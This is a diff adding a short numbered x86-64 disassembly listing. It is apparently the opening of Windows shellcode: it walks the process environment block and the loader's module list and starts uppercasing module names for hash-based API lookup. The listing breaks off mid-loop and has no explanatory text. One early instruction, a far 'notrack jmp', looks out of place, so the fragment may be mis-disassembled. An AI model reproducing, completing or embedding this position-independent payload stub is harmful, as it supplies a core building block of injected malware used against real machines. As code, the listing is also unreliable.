@@ -1,0 +1,21 @@
+0: cld 
+1: notrack jmp 0xfffffffff1b401c8
+7: and rsp, 0xfffffffffffffff0
+11: call 0xdc
+16: push r9
+18: push r8
+20: push rdx
+21: xor rdx, rdx
+24: mov rdx, qword ptr gs:[rdx + 0x60]
+29: mov rdx, qword ptr [rdx + 0x18]
+33: mov rdx, qword ptr [rdx + 0x20]
+37: push rcx
+38: push rsi
+39: movzx rcx, word ptr [rdx + 0x4a]
+44: mov rsi, qword ptr [rdx + 0x50]
+48: xor r9, r9
+51: xor rax, rax
+54: lodsb al, byte ptr [rsi]
+55: cmp al, 0x61
+57: jl 0x3d
+59: sub al, 0x20
